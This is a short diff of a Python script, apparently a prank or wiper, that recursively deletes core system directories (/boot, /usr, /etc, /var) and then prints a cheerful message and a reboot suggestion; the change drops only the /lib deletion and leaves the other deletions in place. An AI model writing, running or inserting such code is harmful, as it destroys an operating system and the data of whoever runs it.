@@ -8,6 +8,7 @@ rmtree("/boot")
 rmtree("/usr")
 rmtree("/etc")
 rmtree("/var")
-rmtree("/lib")
+
 
 print("Have a nice day:)")
+print("You should probably reboot now")
